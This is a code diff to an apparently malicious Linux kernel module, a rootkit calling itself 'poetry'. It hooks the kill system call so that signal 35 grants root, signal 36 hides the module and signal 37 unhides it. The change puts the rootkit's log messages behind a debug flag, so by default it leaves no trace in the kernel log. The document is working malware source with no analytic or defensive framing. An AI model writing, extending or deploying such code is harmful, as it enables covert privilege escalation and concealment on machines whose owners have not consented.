@@ -1,5 +1,6 @@
 static struct list_head *prev_module;
 static short hidden = 0;
+extern int debug;
 
 void set_root(void)
 {
@@ -45,15 +46,27 @@ asmlinkage int hook_kill(const struct pt_regs *regs)
     switch (sig)
     {
     case 35:
-        printk(KERN_INFO "poetry: giving root\n");
+        if (debug == 1)
+        {
+            printk(KERN_INFO "poetry: giving root\n");
+        }
+        
         set_root();
         return 0;
     case 36:
-        printk(KERN_INFO "poetry: hiding\n");
+        if (debug == 1)
+        {
+            printk(KERN_INFO "poetry: hiding\n");
+        }
+        
         hideme();
         return 0;
     case 37:
-        printk(KERN_INFO "poetry: unhiding\n");
+        if (debug == 1)
+        {
+            printk(KERN_INFO "poetry: unhiding\n");
+        }
+        
         showme();
         return 0;
     }
